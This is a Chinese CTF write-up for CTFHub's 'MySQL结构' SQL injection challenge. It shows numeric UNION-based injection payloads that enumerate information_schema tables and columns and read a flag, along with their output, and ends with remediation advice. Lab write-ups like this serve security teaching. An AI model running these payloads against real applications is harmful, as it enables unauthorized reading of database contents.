CTFHub - Web - SQL注入 - MySQL结构

# CTFHub # Web # SQL注入 # MySQL结构 # information_schema

一、题目信息

  • 题目名称：MySQL结构
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：枚举 MySQL 数据库结构并读取 flag。

二、确认 SQL 注入

首页提供 id 查询参数。提交 id=1 后，页面会直接回显执行的 SQL 语句和查询结果：

select * from news where id=1

ID: 1
Data: ctfhub

参数值没有使用单引号包裹，说明这是数字型注入点。继续构造永真和永假条件：

id=1 and 1=1
# 返回 ID: 1、Data: ctfhub

id=1 and 1=2
# 没有返回数据

条件为真时正常返回，条件为假时无结果，可以确认 id 参数存在 SQL 注入。

三、确定查询列数

先使用 order by 判断原查询的列数。提交 order by 2 正常返回，提交 order by 3 无结果，因此原查询共有两列。

接下来使用一个不存在的 id，让页面优先回显 UNION 查询的结果：

0 union select 1,2

ID: 1
Data: 2

两个位置均可正常回显。后续会把枚举内容放在第一列，将常量 2 放在第二列。

四、获取数据库基本信息

将当前数据库名和 MariaDB 版本分别放入两个回显位置：

0 union select database(),version()

ID: sqli
Data: 10.3.22-MariaDB-0+deb10u1

当前数据库为 sqli。题目名称提示需要关注 MySQL 结构，因此下一步查询系统库 information_schema。

五、枚举数据表和字段

查询当前数据库中的全部表名：

0 union select group_concat(table_name),2
from information_schema.tables
where table_schema=database()

ID: wejwrktgwx,news
Data: 2

除了业务表 news，还存在随机表名 wejwrktgwx。继续查询当前数据库中的字段名：

0 union select group_concat(column_name),2
from information_schema.columns
where table_schema=database()

ID: gbiknmlinp,id,data
Data: 2

结合表名和字段枚举结果，可以确定目标数据位于 wejwrktgwx.gbiknmlinp。

六、读取 Flag

读取目标字段，并将结果放入第一个回显位置：

0 union select gbiknmlinp,2 from wejwrktgwx

ID: ctfhub{3880d4605867cea8f0135181}
Data: 2

对应的 URL 编码 Payload：

/?id=0%20union%20select%20gbiknmlinp,2%20from%20wejwrktgwx

七、最终 Flag

ctfhub{3880d4605867cea8f0135181}

八、修复建议

  • 使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。
  • 对 id 等参数执行严格的整数类型校验，只接受合法数字。
  • 数据库账号遵循最小权限原则，Web 应用不应使用 root 账号连接数据库。
  • 关闭生产环境中的 SQL 错误和语句回显，避免泄露数据库结构。
  • 限制业务账号访问 information_schema 的权限，降低敏感结构被枚举的风险。

九、解题总结

本题的核心是确认两列 UNION 注入点后，利用 information_schema.tables 和 information_schema.columns 枚举数据库结构。MySQL 表名或字段名未知时，可以先使用 group_concat() 汇总结果，再根据表与字段的对应关系读取目标数据。
